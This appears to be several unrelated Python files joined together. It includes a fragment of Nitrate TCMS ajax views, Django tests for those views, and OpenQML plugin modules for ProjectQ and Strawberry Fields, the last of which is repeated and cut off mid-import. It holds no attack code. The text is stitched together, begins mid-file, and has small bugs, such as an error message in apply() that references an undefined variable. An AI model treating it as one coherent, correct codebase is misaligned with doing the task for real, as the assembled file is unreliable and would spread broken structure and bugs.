update_cases_reviewer = update_cases_default_tester


@require_POST
def comment_case_runs(request):
    """
    Add comment to one or more caseruns at a time.
    """
    data = request.POST.copy()
    comment = data.get('comment', None)
    if not comment:
        return say_no('Comments needed')
    run_ids = [i for i in data.get('run', '').split(',') if i]
    if not run_ids:
        return say_no('No runs selected.')
    runs = TestCaseRun.objects.filter(pk__in=run_ids).only('pk')
    if not runs:
        return say_no('No caserun found.')
    add_comment(runs, comment, request.user)
    return say_yes()


def clean_bug_form(request):
    """
    Verify the form data, return a tuple\n
    (None, ERROR_MSG) on failure\n
    or\n
    (data_dict, '') on success.\n
    """
    data = {}
    try:
        data['bugs'] = request.GET.get('bug_id', '').split(',')
        data['runs'] = map(int, request.GET.get('case_runs', '').split(','))
    except (TypeError, ValueError) as e:
        return (None, 'Please specify only integers for bugs, '
                      'caseruns(using comma to seperate IDs), '
                      'and bug_system. (DEBUG INFO: %s)' % str(e))

    data['bug_system_id'] = int(request.GET.get('bug_system_id', 1))

    if request.GET.get('a') not in ('add', 'remove'):
        return (None, 'Actions only allow "add" and "remove".')
    else:
        data['action'] = request.GET.get('a')
    data['bz_external_track'] = True if request.GET.get('bz_external_track',
                                                        False) else False

    return (data, '')


def update_bugs_to_caseruns(request):
    """
    Add one or more bugs to or remove that from\n
    one or more caserun at a time.
    """
    data, error = clean_bug_form(request)
    if error:
        return say_no(error)
    runs = TestCaseRun.objects.filter(pk__in=data['runs'])
    bug_system_id = data['bug_system_id']
    bug_ids = data['bugs']

    try:
        validate_bug_id(bug_ids, bug_system_id)
    except ValidationError as e:
        return say_no(str(e))

    bz_external_track = data['bz_external_track']
    action = data['action']
    try:
        if action == "add":
            for run in runs:
                for bug_id in bug_ids:
                    run.add_bug(bug_id=bug_id,
                                bug_system_id=bug_system_id,
                                bz_external_track=bz_external_track)
        else:
            bugs = Bug.objects.filter(bug_id__in=bug_ids)
            for run in runs:
                for bug in bugs:
                    if bug.case_run_id == run.pk:
                        run.remove_bug(bug.bug_id, run.pk)
    except Exception as e:
        return say_no(str(e))
    return say_yes()


def get_prod_related_objs(p_pks, target):
    """
    Get Component, Version, Category, and Build\n
    Return [(id, name), (id, name)]
    """
    ctypes = {
        'component': (Component, 'name'),
        'version': (Version, 'value'),
        'build': (Build, 'name'),
        'category': (Category, 'name'),
    }
    results = ctypes[target][0]._default_manager.filter(product__in=p_pks)
    attr = ctypes[target][1]
    results = [(r.pk, getattr(r, attr)) for r in results]
    return results


def get_prod_related_obj_json(request):
    """
    View for updating product drop-down\n
    in a Ajax way.
    """
    data = request.GET.copy()
    target = data.get('target', None)
    p_pks = data.get('p_ids', None)
    sep = data.get('sep', None)
    # py2.6: all(*values) => boolean ANDs
    if target and p_pks and sep:
        p_pks = [k for k in p_pks.split(sep) if k]
        res = get_prod_related_objs(p_pks, target)
    else:
        res = []
    return HttpResponse(json.dumps(res))


def objects_update(objects, **kwargs):
    objects.update(**kwargs)
    kwargs['instances'] = objects
    if objects.model.__name__ == TestCaseRun.__name__ and kwargs.get(
            'case_run_status', None):
        POST_UPDATE_SIGNAL.send(sender=None, **kwargs)

# -*- coding: utf-8 -*-

import json
from http import HTTPStatus
from urllib.parse import urlencode

from django import test
from django.conf import settings
from django.contrib.contenttypes.models import ContentType
from django.core import serializers
from django.urls import reverse
from django_comments.models import Comment

from tcms.management.models import Priority
from tcms.management.models import EnvGroup
from tcms.management.models import EnvProperty
from tcms.testcases.forms import CaseAutomatedForm                    
from tcms.testcases.forms import TestCase
from tcms.testplans.models import TestPlan
from tcms.testruns.models import TestCaseRun
from tcms.testruns.models import TestCaseRunStatus
from tcms.tests import BaseCaseRun
from tcms.tests import BasePlanCase
from tcms.tests import remove_perm_from_user
from tcms.tests import user_should_have_perm
from tcms.tests.factories import UserFactory
from tcms.tests.factories import EnvGroupFactory
from tcms.tests.factories import EnvGroupPropertyMapFactory
from tcms.tests.factories import EnvPropertyFactory


class TestNavigation(test.TestCase):
    @classmethod
    def setUpTestData(cls):
        super(TestNavigation, cls).setUpTestData()
        cls.user = UserFactory(email='user+1@example.com')
        cls.user.set_password('testing')
        cls.user.save()

    def test_urls_for_emails_with_pluses(self):
        # test for https://github.com/Nitrate/Nitrate/issues/262
        # when email contains + sign it needs to be properly urlencoded
        # before passing it as query string argument to the search views
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.user.username,
            password='testing')
        response = self.client.get(reverse('iframe-navigation'))

        self.assertContains(response, urlencode({'people': self.user.email}))
        self.assertContains(response, urlencode({'author__email__startswith': self.user.email}))


class TestIndex(BaseCaseRun):
    def test_when_not_logged_in_index_page_redirects_to_login(self):
        response = self.client.get(reverse('core-views-index'))
        self.assertRedirects(
            response,
            reverse('tcms-login'),
            target_status_code=HTTPStatus.OK)

    def test_when_logged_in_index_page_redirects_to_dashboard(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')
        response = self.client.get(reverse('core-views-index'))
        self.assertRedirects(
            response,
            reverse('tcms-recent', args=[self.tester.username]),
            target_status_code=HTTPStatus.OK)


class TestCommentCaseRuns(BaseCaseRun):
    """Test case for ajax.comment_case_runs"""

    @classmethod
    def setUpTestData(cls):
        super(TestCommentCaseRuns, cls).setUpTestData()
        cls.many_comments_url = reverse('ajax-comment_case_runs')

    def test_refuse_if_missing_comment(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.many_comments_url,
                                    {'run': [self.case_run_1.pk, self.case_run_2.pk]})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'Comments needed'})

    def test_refuse_if_missing_no_case_run_pk(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.many_comments_url,
                                    {'comment': 'new comment', 'run': []})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'No runs selected.'})

        response = self.client.post(self.many_comments_url,
                                    {'comment': 'new comment'})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'No runs selected.'})

    def test_refuse_if_passed_case_run_pks_not_exist(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.many_comments_url,
                                    {'comment': 'new comment',
                                     'run': '99999998,1009900'})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'No caserun found.'})

    def test_add_comment_to_case_runs(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        new_comment = 'new comment'
        response = self.client.post(
            self.many_comments_url,
            {'comment': new_comment,
             'run': ','.join([str(self.case_run_1.pk),
                              str(self.case_run_2.pk)])})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})

        # Assert comments are added
        case_run_ct = ContentType.objects.get_for_model(TestCaseRun)

        for case_run_pk in (self.case_run_1.pk, self.case_run_2.pk):
            comments = Comment.objects.filter(object_pk=case_run_pk,
                                              content_type=case_run_ct)
            self.assertEqual(new_comment, comments[0].comment)
            self.assertEqual(self.tester, comments[0].user)


class TestUpdateObject(BasePlanCase):
    """Test case for update"""

    @classmethod
    def setUpTestData(cls):
        super(TestUpdateObject, cls).setUpTestData()

        cls.permission = 'testplans.change_testplan'
        cls.update_url = reverse('ajax-update')

    def setUp(self):
        user_should_have_perm(self.tester, self.permission)

    def test_refuse_if_missing_permission(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        remove_perm_from_user(self.tester, self.permission)

        post_data = {
            'content_type': 'testplans.testplan',
            'object_pk': self.plan.pk,
            'field': 'is_active',
            'value': 'False',
            'value_type': 'bool'
        }

        response = self.client.post(self.update_url, post_data)

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'Permission Dinied.'})

    def test_update_plan_is_active(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        post_data = {
            'content_type': 'testplans.testplan',
            'object_pk': self.plan.pk,
            'field': 'is_active',
            'value': 'False',
            'value_type': 'bool'
        }

        response = self.client.post(self.update_url, post_data)

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})
        plan = TestPlan.objects.get(pk=self.plan.pk)
        self.assertFalse(plan.is_active)


class TestUpdateCaseRunStatus(BaseCaseRun):
    """Test case for update_case_run_status"""

    @classmethod
    def setUpTestData(cls):
        super(TestUpdateCaseRunStatus, cls).setUpTestData()

        cls.permission = 'testruns.change_testcaserun'
        cls.update_url = reverse('ajax-update_case_run_status')

    def setUp(self):
        user_should_have_perm(self.tester, self.permission)

    def test_refuse_if_missing_permission(self):
        remove_perm_from_user(self.tester, self.permission)
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.update_url, {
            'content_type': 'testruns.testcaserun',
            'object_pk': self.case_run_1.pk,
            'field': 'case_run_status',
            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),
            'value_type': 'int',
        })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'Permission Dinied.'})

    def test_change_case_run_status(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.update_url, {
            'content_type': 'testruns.testcaserun',
            'object_pk': self.case_run_1.pk,
            'field': 'case_run_status',
            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),
            'value_type': 'int',
        })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})
        self.assertEqual(
            'PAUSED', TestCaseRun.objects.get(pk=self.case_run_1.pk).case_run_status.name)


class TestGetForm(test.TestCase):                    
    """Test case for form"""                    

    def test_get_form(self):                    
        response = self.client.get(reverse('ajax-form'),                    
                                   {'app_form': 'testcases.CaseAutomatedForm'})                    
        form = CaseAutomatedForm()                    
        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())                    


class TestUpdateCasePriority(BasePlanCase):
    """Test case for update_cases_default_tester"""

    @classmethod
    def setUpTestData(cls):
        super(TestUpdateCasePriority, cls).setUpTestData()

        cls.permission = 'testcases.change_testcase'
        cls.case_update_url = reverse('ajax-update_cases_default_tester')

    def setUp(self):
        user_should_have_perm(self.tester, self.permission)

    def test_refuse_if_missing_permission(self):
        remove_perm_from_user(self.tester, self.permission)
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(
            self.case_update_url,
            {
                'target_field': 'priority',
                'from_plan': self.plan.pk,
                'case': [self.case_1.pk, self.case_3.pk],
                'new_value': Priority.objects.get(value='P3').pk,
            })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': "You don't have enough permission to "
                                  "update TestCases."})

    def test_update_case_priority(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(
            self.case_update_url,
            {
                'target_field': 'priority',
                'from_plan': self.plan.pk,
                'case': [self.case_1.pk, self.case_3.pk],
                'new_value': Priority.objects.get(value='P3').pk,
            })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})

        for pk in (self.case_1.pk, self.case_3.pk):
            self.assertEqual('P3', TestCase.objects.get(pk=pk).priority.value)


class TestGetObjectInfo(BasePlanCase):
    """Test case for info view method"""

    @classmethod
    def setUpTestData(cls):
        super(TestGetObjectInfo, cls).setUpTestData()

        cls.get_info_url = reverse('ajax-info')

        cls.group_nitrate = EnvGroupFactory(name='nitrate')
        cls.group_new = EnvGroupFactory(name='NewGroup')

        cls.property_os = EnvPropertyFactory(name='os')
        cls.property_python = EnvPropertyFactory(name='python')
        cls.property_django = EnvPropertyFactory(name='django')

        EnvGroupPropertyMapFactory(group=cls.group_nitrate,
                                   property=cls.property_os)
        EnvGroupPropertyMapFactory(group=cls.group_nitrate,
                                   property=cls.property_python)
        EnvGroupPropertyMapFactory(group=cls.group_new,
                                   property=cls.property_django)

    def test_get_env_properties(self):
        response = self.client.get(self.get_info_url, {'info_type': 'env_properties'})

        expected_json = json.loads(
            serializers.serialize(
                'json',
                EnvProperty.objects.all(),
                fields=('name', 'value')))
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            expected_json)

    def test_get_env_properties_by_group(self):
        response = self.client.get(self.get_info_url,
                                   {'info_type': 'env_properties',
                                    'env_group_id': self.group_new.pk})

        group = EnvGroup.objects.get(pk=self.group_new.pk)
        expected_json = json.loads(
            serializers.serialize(
                'json',
                group.property.all(),
                fields=('name', 'value')))
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            expected_json)

# Copyright 2018 Xanadu Quantum Technologies Inc.

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

#     http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
r"""
ProjectQ plugin
========================

**Module name:** :mod:`openqml.plugins.projectq`

.. currentmodule:: openqml.plugins.projectq

This plugin provides the interface between OpenQML and ProjecQ.
It enables OpenQML to optimize quantum circuits simulable with ProjectQ.

ProjecQ supports several different backends. Of those, the following are useful in the current context:

- projectq.backends.Simulator([gate_fusion, ...])	Simulator is a compiler engine which simulates a quantum computer using C++-based kernels.
- projectq.backends.ClassicalSimulator()	        A simple introspective simulator that only permits classical operations.
- projectq.backends.IBMBackend([use_hardware, ...])	The IBM Backend class, which stores the circuit, transforms it to JSON QASM, and sends the circuit through the IBM API.

See PluginAPI._capabilities['backend'] for a list of backend options.

Functions
---------

.. autosummary::
   init_plugin

Classes
-------

.. autosummary::
   Gate
   Observable
   PluginAPI

----
"""
import logging as log
import numpy as np
from numpy.random import (randn,)
from openqml import Device, DeviceError
from openqml import Variable

import projectq as pq
import projectq.setups.ibm #todo only import this if necessary

# import operations
from projectq.ops import (HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, SqrtSwapGate, Rx, Ry, Rz, R)
from .ops import (CNOT, CZ, Toffoli, AllZGate, Rot, Hermitian)

from ._version import __version__


operator_map = {
    'PauliX': XGate,
    'PauliY': YGate,
    'PauliZ': ZGate,
    'CNOT': CNOT,
    'CZ': CZ,
    'SWAP': SwapGate,
    'RX': Rx,
    'RY': Ry,
    'RZ': Rz,
    'Rot': Rot,
    #'PhaseShift': #todo: implement
    #'QubitStateVector': #todo: implement
    #'QubitUnitary': #todo: implement
    #: H, #todo: implement
    #: S, #todo: implement
    #: T, #todo: implement
    #: SqrtX, #todo: implement
    #: SqrtSwap, #todo: implement
    #: R, #todo: implement
    #'AllPauliZ': AllZGate, #todo: implement
    #'Hermitian': #todo: implement
}

class ProjectQDevice(Device):
    """ProjectQ device for OpenQML.

    Args:
       wires (int): The number of qubits of the device.

    Keyword Args for Simulator backend:
      gate_fusion (bool): If True, gates are cached and only executed once a certain gate-size has been reached (only has an effect for the c++ simulator).
      rnd_seed (int): Random seed (uses random.randint(0, 4294967295) by default).

    Keyword Args for IBMBackend backend:
      use_hardware (bool): If True, the code is run on the IBM quantum chip (instead of using the IBM simulator)
      num_runs (int): Number of runs to collect statistics. (default is 1024)
      verbose (bool): If True, statistics are printed, in addition to the measurement result being registered (at the end of the circuit).
      user (string): IBM Quantum Experience user name
      password (string): IBM Quantum Experience password
      device (string): Device to use (ibmqx4, or ibmqx5) if use_hardware is set to True. Default is ibmqx4.
      retrieve_execution (int): Job ID to retrieve instead of re-running the circuit (e.g., if previous run timed out).
    """
    name = 'ProjectQ OpenQML plugin'
    short_name = 'projectq'
    api_version = '0.1.0'
    plugin_version = __version__
    author = 'Christian Gogolin'
    _capabilities = {'backend': list(["Simulator", "ClassicalSimulator", "IBMBackend"])}

    def __init__(self, wires, **kwargs):
        kwargs.setdefault('shots', 0)
        super().__init__(self.short_name, kwargs['shots'])

        # translate some aguments
        for k,v in {'log':'verbose'}.items():
            if k in kwargs:
                kwargs.setdefault(v, kwargs[k])

        # clean some arguments
        if 'num_runs' in kwargs:
            if isinstance(kwargs['num_runs'], int) and kwargs['num_runs']>0:
                self.n_eval = kwargs['num_runs']
            else:
                self.n_eval = 0
                del(kwargs['num_runs'])

        self.wires = wires
        self.backend = kwargs['backend']
        del(kwargs['backend'])
        self.kwargs = kwargs
        self.eng = None
        self.reg = None
        #self.reset() #the actual initialization is done in reset(), but we don't need to call this manually as Device does it for us during __enter__()

    def reset(self):
        self.reg = self.eng.allocate_qureg(self.wires)

    def __repr__(self):
        return super().__repr__() +'Backend: ' +self.backend +'\n'

    def __str__(self):
        return super().__str__() +'Backend: ' +self.backend +'\n'

    # def __del__(self):
    #     self._deallocate()

    def execute(self):                    
        """ """                    
        #todo: I hope this function will become superfluous, see https://github.com/XanaduAI/openqml/issues/18
        self._out = self.execute_queued()                    

    def execute_queued(self):
        """Apply the queued operations to the device, and measure the expectation."""
        #expectation_values = {}
        for operation in self._queue:
            if operation.name not in operator_map:
                raise DeviceError("{} not supported by device {}".format(operation.name, self.short_name))

            par = [x.val if isinstance(x, Variable) else x for x in operation.params]
            #expectation_values[tuple(operation.wires)] = self.apply(operator_map[operation.name](*p), self.reg, operation.wires)
            self.apply(operation.name, operation.wires, *par)

        result = self.expectation(self._observe.name, self._observe.wires)
        self._deallocate()
        return result

        # if self._observe.wires is not None:
        #     if isinstance(self._observe.wires, int):
        #         return expectation_values[tuple([self._observe.wires])]
        #     else:
        #         return np.array([expectation_values[tuple([idx])] for idx in self._observe.wires if tuple([idx]) in expectation_values])

    def apply(self, gate_name, wires, *par):
        if gate_name not in self._gates:
            raise ValueError('Gate {} not supported on this backend'.format(gate))

        gate = operator_map[gate_name](*par)
        if isinstance(wires, int):
            gate | self.reg[wires]
        else:
            gate | tuple([self.reg[i] for i in wires])

    def expectation(self, observable, wires):
        raise NotImplementedError("expectation() is not yet implemented for this backend")

    def shutdown(self):
        """Shutdown.

        """
        pass

    def _deallocate(self):
        """Deallocate all qubits to make ProjectQ happy

        See also: https://github.com/ProjectQ-Framework/ProjectQ/issues/2

        Drawback: This is probably rather resource intensive.
        """
        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':
            pq.ops.All(pq.ops.Measure) | self.reg #avoid an unfriendly error message: https://github.com/ProjectQ-Framework/ProjectQ/issues/2

    def _deallocate2(self):
        """Another proposal for how to deallocate all qubits to make ProjectQ happy

        Unsuitable because: Produces a segmentation fault.
        """
        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':
             for qubit in self.reg:
                 self.eng.deallocate_qubit(qubit)

    def _deallocate3(self):
        """Another proposal for how to deallocate all qubits to make ProjectQ happy

        Unsuitable because: Throws an error if the probability for the given collapse is 0.
        """
        if self.eng is not None and self.backend == 'Simulator' or self.backend == 'IBMBackend':
            self.eng.flush()
            self.eng.backend.collapse_wavefunction(self.reg, [0 for i in range(len(self.reg))])


    # def requires_credentials(self):
    #     """Check whether this plugin requires credentials
    #     """
    #     if self.backend == 'IBMBackend':
    #         return True
    #     else:
    #         return False


    def filter_kwargs_for_backend(self, kwargs):
        return { key:value for key,value in kwargs.items() if key in self._backend_kwargs }


class ProjectQSimulator(ProjectQDevice):
    """ProjectQ Simulator device for OpenQML.

    Args:
       wires (int): The number of qubits of the device.

    Keyword Args:
      gate_fusion (bool): If True, gates are cached and only executed once a certain gate-size has been reached (only has an effect for the c++ simulator).
      rnd_seed (int): Random seed (uses random.randint(0, 4294967295) by default).
    """

    short_name = 'projectq.simulator'
    _gates = set(operator_map.keys())
    _observables = set([ key for (key,val) in operator_map.items() if val in [XGate, YGate, ZGate, AllZGate, Hermitian] ])
    _circuits = {}
    _backend_kwargs = ['gate_fusion', 'rnd_seed']

    def __init__(self, wires, **kwargs):
        kwargs['backend'] = 'Simulator'
        super().__init__(wires, **kwargs)

    def reset(self):
        """Resets the engine and backend

        After the reset the Device should be as if it was just constructed.
        Most importantly the quantum state is reset to its initial value.
        """
        backend = pq.backends.Simulator(**self.filter_kwargs_for_backend(self.kwargs))
        self.eng = pq.MainEngine(backend)
        super().reset()


    def expectation(self, observable, wires):
        self.eng.flush(deallocate_qubits=False)
        if observable == 'PauliX' or observable == 'PauliY' or observable == 'PauliZ':
            expectation_value = self.eng.backend.get_expectation_value(pq.ops.QubitOperator(str(observable)[-1]+'0'), self.reg)
            variance = 1 - expectation_value**2
        elif observable == 'AllPauliZ':
            expectation_value = [ self.eng.backend.get_expectation_value(pq.ops.QubitOperator("Z"+'0'), [qubit]) for qubit in self.reg]
            variance = [1 - e**2 for e in expectation_value]
        else:
            raise NotImplementedError("Estimation of expectation values not yet implemented for the observable {} in backend {}.".format(observable, self.backend))

        return expectation_value#, variance


class ProjectQClassicalSimulator(ProjectQDevice):
    """ProjectQ ClassicalSimulator device for OpenQML.

    Args:
       wires (int): The number of qubits of the device.
    """

    short_name = 'projectq.classicalsimulator'
    _gates = set([ key for (key,val) in operator_map.items() if val in [XGate, CNOT] ])
    _observables = set([ key for (key,val) in operator_map.items() if val in [ZGate, AllZGate] ])
    _circuits = {}
    _backend_kwargs = []

    def __init__(self, wires, **kwargs):
        kwargs['backend'] = 'ClassicalSimulator'
        super().__init__(wires, **kwargs)

    def reset(self):
        """Resets the engine and backend

        After the reset the Device should be as if it was just constructed.
        Most importantly the quantum state is reset to its initial value.
        """
        backend = pq.backends.ClassicalSimulator(**self.filter_kwargs_for_backend(self.kwargs))
        self.eng = pq.MainEngine(backend)
        super().reset()

class ProjectQIBMBackend(ProjectQDevice):
    """ProjectQ IBMBackend device for OpenQML.

    Args:
       wires (int): The number of qubits of the device.

    Keyword Args:
      use_hardware (bool): If True, the code is run on the IBM quantum chip (instead of using the IBM simulator)
      num_runs (int): Number of runs to collect statistics. (default is 1024)
      verbose (bool): If True, statistics are printed, in addition to the measurement result being registered (at the end of the circuit).
      user (string): IBM Quantum Experience user name
      password (string): IBM Quantum Experience password
      device (string): Device to use (ibmqx4, or ibmqx5) if use_hardware is set to True. Default is ibmqx4.
      retrieve_execution (int): Job ID to retrieve instead of re-running the circuit (e.g., if previous run timed out).
    """

    short_name = 'projectq.ibmbackend'
    _gates = set([ key for (key,val) in operator_map.items() if val in [HGate, XGate, YGate, ZGate, SGate, TGate, SqrtXGate, SwapGate, Rx, Ry, Rz, R, CNOT, CZ] ])
    _observables = set([ key for (key,val) in operator_map.items() if val in [ZGate, AllZGate] ])
    _circuits = {}
    _backend_kwargs = ['use_hardware', 'num_runs', 'verbose', 'user', 'password', 'device', 'retrieve_execution']

    def __init__(self, wires, **kwargs):
        # check that necessary arguments are given
        if 'user' not in kwargs:
            raise ValueError('An IBM Quantum Experience user name specified via the "user" keyword argument is required')
        if 'password' not in kwargs:
            raise ValueError('An IBM Quantum Experience password specified via the "password" keyword argument is required')

        kwargs['backend'] = 'IBMBackend'
        #kwargs['verbose'] = True #todo: remove when done testing
        #kwargs['log'] = True #todo: remove when done testing
        #kwargs['use_hardware'] = False #todo: remove when done testing
        #kwargs['num_runs'] = 3 #todo: remove when done testing
        super().__init__(wires, **kwargs)

    def reset(self):
        """Resets the engine and backend

        After the reset the Device should be as if it was just constructed.
        Most importantly the quantum state is reset to its initial value.
        """
        backend = pq.backends.IBMBackend(**self.filter_kwargs_for_backend(self.kwargs))
        self.eng = pq.MainEngine(backend, engine_list=pq.setups.ibm.get_engine_list())
        super().reset()

    def expectation(self, observable, wires):
        pq.ops.R(0) | self.reg[0]# todo:remove this once https://github.com/ProjectQ-Framework/ProjectQ/issues/259 is resolved

        pq.ops.All(pq.ops.Measure) | self.reg
        self.eng.flush()

        if observable == 'PauliZ':
            probabilities = self.eng.backend.get_probabilities([self.reg[wires]])
            #print("IBM probabilities="+str(probabilities))
            if '1' in probabilities:
                expectation_value = 2*probabilities['1']-1
            else:
                expectation_value = -(2*probabilities['0']-1)
            variance = 1 - expectation_value**2
        elif observable == 'AllPauliZ':
            probabilities = self.eng.backend.get_probabilities(self.reg)
            #print("IBM all probabilities="+str(probabilities))
            expectation_value = [ ((2*sum(p for (state,p) in probabilities.items() if state[i] == '1')-1)-(2*sum(p for (state,p) in probabilities.items() if state[i] == '0')-1)) for i in range(len(self.reg)) ]
            variance = [1 - e**2 for e in expectation_value]
        else:
            raise NotImplementedError("Estimation of expectation values not yet implemented for the observable {} in backend {}.".format(observable, self.backend))

        return expectation_value#, variance

# Copyright 2018 Xanadu Quantum Technologies Inc.

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

#     http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""This module contains the device class and context manager"""
import numpy as np
from openqml import Device, DeviceError
from openqml import Variable

import strawberryfields as sf

#import state preparations
from strawberryfields.ops import (Catstate, Coherent, DensityMatrix, DisplacedSqueezed,
                                  Fock, Ket, Squeezed, Thermal, Gaussian)
# import decompositions
from strawberryfields.ops import (GaussianTransform, Interferometer)
# import gates
from strawberryfields.ops import (BSgate, CKgate, CXgate, CZgate, Dgate, Fouriergate,
                                  Kgate, Pgate, Rgate, S2gate, Sgate, Vgate, Xgate, Zgate)
# import measurements
from strawberryfields.ops import (MeasureFock, MeasureHeterodyne, MeasureHomodyne)


from ._version import __version__


operator_map = {
    'CatState:': Catstate,
    'CoherentState': Coherent,
    'FockDensityMatrix': DensityMatrix,
    'DisplacedSqueezed': DisplacedSqueezed,
    'FockState': Fock,
    'FockStateVector': Ket,
    'SqueezedState': Squeezed,
    'ThermalState': Thermal,
    'GaussianState': Gaussian,
    'Beamsplitter': BSgate,
    'CrossKerr': CKgate,
    'ControlledAddition': CXgate,
    'ControlledPhase': CZgate,
    'Displacement': Dgate,
    'Kerr': Kgate,
    'QuadraticPhase': Pgate,
    'Rotation': Rgate,
    'TwoModeSqueezing': S2gate,
    'Squeezing': Sgate,
    'CubicPhase': Vgate,
    # 'XDisplacement': Xgate,
    # 'PDisplacement': Zgate,
    # 'MeasureFock': MeasureFock,
    # 'MeasureHomodyne': MeasureHomodyne
}


class StrawberryFieldsFock(Device):
    """StrawberryFields Fock device for OpenQML.

    wires (int): the number of modes to initialize the device in.
    cutoff (int): the Fock space truncation. Must be specified before
        applying a qfunc.
    hbar (float): the convention chosen in the canonical commutation
        relation [x, p] = i hbar. The default value is hbar=2.
    """
    name = 'Strawberry Fields OpenQML plugin'
    short_name = 'strawberryfields.fock'
    api_version = '0.1.0'
    version = __version__
    author = 'Josh Izaac'
    _gates = set(operator_map.keys())
    _observables = {'Fock', 'X', 'P', 'Homodyne'}
    _circuits = {}

    def __init__(self, wires, *, shots=0, cutoff=None, hbar=2):
        self.wires = wires
        self.cutoff = cutoff
        self.hbar = hbar
        self.eng = None
        self.state = None
        super().__init__(self.short_name, shots)

    def execute(self):                    
        """Apply the queued operations to the device, and measure the expectation."""
        if self.eng:
            self.eng.reset()
            self.reset()

        self.eng, q = sf.Engine(self.wires, hbar=self.hbar)

        with self.eng:
            for operation in self._queue:
                if operation.name not in operator_map:
                    raise DeviceError("{} not supported by device {}".format(operation.name, self.short_name))

                p = [x.val if isinstance(x, Variable) else x for x in operation.params]
                op = operator_map[operation.name](*p)
                if isinstance(operation.wires, int):
                    op | q[operation.wires]
                else:
                    op | [q[i] for i in operation.wires]

        self.state = self.eng.run('fock', cutoff_dim=self.cutoff)

        # calculate expectation value
        reg = self._observe.wires
        if self._observe.name == 'Fock':
            ex = self.state.mean_photon(reg)
            var = 0
        elif self._observe.name == 'X':
            ex, var = self.state.quad_expectation(reg, 0)
        elif self._observe.name == 'P':
            ex, var = self.state.quad_expectation(reg, np.pi/2)
        elif self._observe.name == 'Homodyne':
            ex, var = self.state.quad_expectation(reg, *self.observe.params)

        if self.shots != 0:
            # estimate the expectation value
            # use central limit theorem, sample normal distribution once, only ok
            # if shots is large (see https://en.wikipedia.org/wiki/Berry%E2%80%93Esseen_theorem)
            ex = np.random.normal(ex, np.sqrt(var / self.shots))

        self._out = ex

    def reset(self):
        """Reset the device"""
        if self.eng is not None:
            self.eng = None
            self.state = None

# Copyright 2018 Xanadu Quantum Technologies Inc.

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

#     http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
"""This module contains the device class and context manager"""
import numpy as np
from openqml import Device, DeviceError
from openqml import Variable

import strawberryfields as sf

#import state preparations
from strawberryfields.ops import (Catstate, Coherent, DensityMatrix, DisplacedSqueezed,
                                  Fock, Ket, Squeezed, Thermal, Gaussian)
# import decompositions
from strawberryfields.ops import (GaussianTransform, Interferometer)
# import gates
